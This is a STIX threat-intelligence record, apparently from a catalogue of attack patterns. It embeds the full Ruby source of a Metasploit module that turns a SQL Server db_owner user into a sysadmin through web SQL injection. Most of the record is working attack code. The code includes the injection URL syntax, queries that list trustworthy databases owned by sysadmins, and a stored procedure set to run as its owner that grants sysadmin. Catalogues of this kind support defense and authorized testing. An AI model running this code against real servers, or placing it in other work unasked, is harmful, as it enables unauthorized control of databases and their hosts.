{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9b2c2912-3423-4428-adc1-f11dbd34a734",
    "created": "2024-08-14T16:22:29.894763Z",
    "modified": "2024-08-14T16:22:29.894767Z",
    "name": "Microsoft SQL Server SQLi Escalate Db_Owner",
    "description": " This module can be used to escalate SQL Server user privileges to sysadmin through a web SQL Injection. In order to escalate, the database user must to have the db_owner role in a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin role, the mssql_payload_sqli module can be used to obtain a shell on the system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_escalate_dbowner_sqli.rb",
            "external_id": "mssql_escalate_dbowner_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL_SQLI\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',\n      'Description'    => %q{\n        This module can be used to escalate SQL Server user privileges to sysadmin through a web\n        SQL Injection. In order to escalate, the database user must to have the db_owner role in\n        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin\n        role, the mssql_payload_sqli module can be used to obtain a shell on the system.\n\n        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--\n      },\n      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],\n      'License'        => MSF_LICENSE,\n      'References'     => [['URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]\n    ))\n  end\n\n  def run\n    # Get the database user name\n    print_status(\"Grabbing the database user name from ...\")\n    db_user = get_username\n    if db_user.nil?\n      print_error(\"Unable to grab user name...\")\n      return\n    else\n      print_good(\"Database user: #{db_user}\")\n    end\n\n    # Grab sysadmin status\n    print_status(\"Checking if #{db_user} is already a sysadmin...\")\n    admin_status = check_sysadmin\n\n    if admin_status.nil?\n      print_error(\"Couldn't retrieve user status, aborting...\")\n      return\n    elsif admin_status == '1'\n      print_error(\"#{db_user} is already a sysadmin, no esclation needed.\")\n      return\n    else\n      print_good(\"#{db_user} is NOT a sysadmin, let's try to escalate privileges.\")\n    end\n\n    # Check for trusted databases owned by sysadmins\n    print_status(\"Checking for trusted databases owned by sysadmins...\")\n    trust_db_list = check_trust_dbs\n    if trust_db_list.nil? || trust_db_list.length == 0\n      print_error(\"No databases owned by sysadmin were found flagged as trustworthy.\")\n      return\n    else\n      # Display list of accessible databases to user\n      print_good(\"#{trust_db_list.length} affected database(s) were found:\")\n      trust_db_list.each do |db|\n        print_status(\" - #{db}\")\n      end\n    end\n\n    # Check if the user has the db_owner role in any of the databases\n    print_status(\"Checking if #{db_user} has the db_owner role in any of them...\")\n    owner_status = check_db_owner(trust_db_list)\n    if owner_status.nil?\n      print_error(\"Fail buckets, the user doesn't have db_owner role anywhere.\")\n      return\n    else\n      print_good(\"#{db_user} has the db_owner role on #{owner_status}.\")\n    end\n\n    # Attempt to escalate to sysadmin\n    print_status(\"Attempting to add #{db_user} to sysadmin role...\")\n    escalate_privs(owner_status, db_user)\n\n    admin_status = check_sysadmin\n    if admin_status && admin_status == '1'\n      print_good(\"Success! #{db_user} is now a sysadmin!\")\n    else\n      print_error(\"Fail buckets, something went wrong.\")\n    end\n  end\n\n  def get_username\n    # Setup query to check for database username\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse result\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      user_name = $1\n    else\n      user_name = nil\n    end\n\n    user_name\n  end\n\n  def check_sysadmin\n    # Setup query to check for sysadmin\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse result\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      status = $1\n    else\n      status = nil\n    end\n\n    status\n  end\n\n  def check_trust_dbs\n    # Setup query to check for trusted databases owned by sysadmins\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select cast((SELECT '#{clue_start}'+d.name+'#{clue_end}' as DbName\n      FROM sys.server_principals r\n      INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id\n      INNER JOIN sys.server_principals p ON\n      p.principal_id = m.member_principal_id\n      inner join sys.databases d on suser_sname(d.owner_sid) = p.name\n      WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin' for xml path('')) as int))\"\n\n    # Run query\n    res = mssql_query(sql)\n\n    unless res && res.body\n      return nil\n    end\n\n    # Parse results\n    parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)\n\n    if parsed_result && !parsed_result.empty?\n      parsed_result.flatten!\n      parsed_result.uniq!\n    end\n\n    print_status(\"#{parsed_result.inspect}\")\n\n    parsed_result\n  end\n\n  def check_db_owner(trust_db_list)\n    # Check if the user has the db_owner role is any databases\n    trust_db_list.each do |db|\n      # Setup query\n      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n      sql = \"(select '#{clue_start}'+'#{db}'+'#{clue_end}' as DbName\n        from [#{db}].sys.database_role_members drm\n        join [#{db}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)\n        join [#{db}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)\n        where rp.name = 'db_owner' and mp.name = SYSTEM_USER for xml path(''))\"\n\n      # Run query\n      result = mssql_query(sql)\n\n      unless result && result.body\n        next\n      end\n\n      # Parse result\n      if result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n        return $1\n      end\n    end\n\n    nil\n  end\n\n  # Attempt to escalate privileges\n  def escalate_privs(dbowner_db,db_user)\n    # Create the evil stored procedure WITH EXECUTE AS OWNER\n    evil_sql_create = \"1;use #{dbowner_db};\n      DECLARE @myevil as varchar(max)\n      set @myevil = '\n      CREATE PROCEDURE sp_elevate_me\n      WITH EXECUTE AS OWNER\n      as\n      begin\n      EXEC sp_addsrvrolemember ''#{db_user}'',''sysadmin''\n      end';\n      exec(@myevil);--\"\n    mssql_query(evil_sql_create)\n\n    # Run the evil stored procedure\n    evilsql_run = \"1;use #{dbowner_db};\n      DECLARE @myevil2 as varchar(max)\n      set @myevil2 = 'EXEC sp_elevate_me'\n      exec(@myevil2);--\"\n    mssql_query(evilsql_run)\n\n    # Remove evil procedure\n    evilsql_remove = \"1;use #{dbowner_db};\n      DECLARE @myevil3 as varchar(max)\n      set @myevil3 = 'DROP PROCEDURE sp_elevate_me'\n      exec(@myevil3);--\"\n    mssql_query(evilsql_remove)\n  end\nend\n",
    "x_mitre_contributors": [
        "[ nullbind <scott.sutherland[at]netspi.com>]",
        ""
    ]
}